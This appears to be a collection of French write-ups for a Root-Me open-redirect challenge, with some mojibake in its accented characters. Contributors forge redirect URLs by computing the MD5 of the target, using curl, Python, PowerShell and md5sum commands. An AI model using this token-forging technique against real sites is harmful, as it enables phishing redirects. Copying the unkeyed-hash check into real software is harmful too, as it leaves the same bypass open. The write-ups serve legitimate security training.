Je ne vais pas rÃ©expliquer les explications et analyse du challenge dâ€™autres lâ€™ont trÃ¨s bien fait.
Je vais proposer une solution avec cURL :
curl -G http://challenge01.root-me.org/web-serveur/ch52/ -d "url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371" -o rootme.txt

Lâ€™option -G avec -d permet dâ€™envoyer dâ€™envoyer des donnÃ©es en â€™GETâ€™, lâ€™option -o pour enregistrer le rÃ©sultat dans un fichier, ici texte.
Plus quâ€™Ã  ouvrir le fichier de sorti et on peut y voir le flag dedans ;)

ou



Je ne vais pas reprendre les explications des autres solutions, vous lâ€™aurez compris la variable h doit contenir le hash MD5 de lâ€™URL vers laquelle on souhaite rediriger.
La redirection se fait trÃ¨s rapidement donc il nâ€™est pas facile de copier/coller et je nâ€™avais pas envie dâ€™utiliser du code ou des outils de sniffing.

Pour avoir le temps de copier/coller le code de validation, utilisez une URL qui va gÃ©nÃ©rer un timeout (par exemple un nom de domaine invalide ou un service que ne rÃ©pond pas). Pour ma part, jâ€™ai utilisÃ© celle-ci :
http://challenge01.root-me.org/web-serveur/ch52/?url=https://azertyuiop.com&h=f9338862dd8738de9174ec5112808d79

ou

 Analyse

DÃ©jÃ , une fois sur la page du challenge on remarque que nous ne pouvons que nous rediriger vers des sites prÃ©-choisis.
On regarde vite-fait le code HTML/CSS de la page, et on voit :

<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>

Bon, Ã  partir de lÃ , on sait quâ€™on doit sâ€™amuser avec les redirections par une requÃªte de type GET, on sait quâ€™on doit le faire sur un autre site, mais un paramÃ¨tre bloque : le &h.
A vu de nez on se dit que câ€™est le MD5 du paramÃ¨tre url.
Et comme dit dans lâ€™Ã©noncÃ© : "Trouvez un moyen de faire une redirection vers un domaine autre que ceux proposÃ©s sur la page web.", donc le choix ne notre page web qui servira de redirection importe peu
Exploitation

On code un petit programme en python :

    #!/usr/bin/env python2
    # -*- coding: ascii -*-
    import requests
    import re
    import hashlib
     
    h = hashlib.md5()
    h.update("1")
    page = "http://challenge01.root-me.org/web-serveur/ch52/index.php?"
    url = page + "url=1&h=" + h.hexdigest()
    resultat=requests.get(url)
    r = resultat.text
    if r.find('flag') != -1:
            print(r)

ou

Bon je vais pas rÃ©inventer le monde avec ma solution, mais elle permet de figer la fenÃªtre avec le flag :

Donc je fais une redirection de facebook vers google (comme beaucoup) et je hash tout ce petit monde :

MD5 decode : https://facebook.com:returnUrl=http://google.fr

et le Hash :
3494f10644e5315c4ad66ba9cc98a00e

Ce qui donne lâ€™url suivante :

http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com:returnUrl=http://google.fr&h=3494f10644e5315c4ad66ba9cc98a00e

Et paf le flag reste affichÃ© Ã  lâ€™Ã©cran !! ðŸ˜‡

ou

Je vais proposer une solution avec PowerShell :

PS V:\> Invoke-WebRequest -Uri "http://challenge01.root-me.org/web-serveur/ch52/?url=https://hookb.in/KNRRnPOx&h=ef55e3500dc257c794ccde7f3259436c" | Select-Object -ExpandProperty Content

Fonctionne avec Powershell 3.0+, Invoke-WebRequest est ce quâ€™il y a de plus proche de cURL sous Windows.

ou

MÃ©thode Ã  lâ€™arrache comme on dit chez moi ...

Jâ€™ai regardÃ© la source, dans les liens on observe un facebook

Un petit tour sur md5 Hash Generator (http://www.miraclesalad.com/webtools/md5.php)

Je test si https://facebook.com == a023cfbf5f1c39bdf8407f28b60cd134

Câ€™est le cas, il ne me reste plus quâ€™Ã  faire la somme md5 de https://google.fr ce qui donne : 0edf27c83d4aa4699c0625d27be0e371

Jâ€™ai saisi lâ€™url suivante dans mon navigateur : http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371

La page suivante nous affiche le flag mais juste une seconde alors comme je lâ€™ai prÃ©cisÃ© câ€™est une solution Ã  lâ€™arrache :)

Jâ€™ai fais un imprime Ã©cran et jâ€™ai recopiÃ© le flag Ã  la main.

ou

Les liens dans la page pointent sur diffÃ©rentes ressources, avec un token de vÃ©rification dans lâ€™url, diffÃ©renciÃ© par site. Ce token va servir cÃ´tÃ© serveur Ã  valider que la destination Ã©mane bien de sa page.
http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

En lâ€™occurence notre token a une longueur de 32 caractÃ¨res :

echo -n a023cfbf5f1c39bdf8407f28b60cd134 | wc
      0       1      32

On pense en consÃ©quence Ã©videmment Ã  un MD5, quâ€™on retrouve facilement :

echo -n "https://facebook.com" | md5sum
a023cfbf5f1c39bdf8407f28b60cd134  -

Il suffit alors de crafter une URL appropriÃ©e car on connaÃ®t le â€™secretâ€™ du serveur :

echo -n "http://challenge01.root-me.org/web-serveur/ch52/?url=https://whatever.com&h="$(echo -n "https://whatever.com" | md5sum)
http://challenge01.root-me.org/web-serveur/ch52/?url=https://whatever.com&h=aed197d417d4faf8ba051133b3ab2fa9 

ou

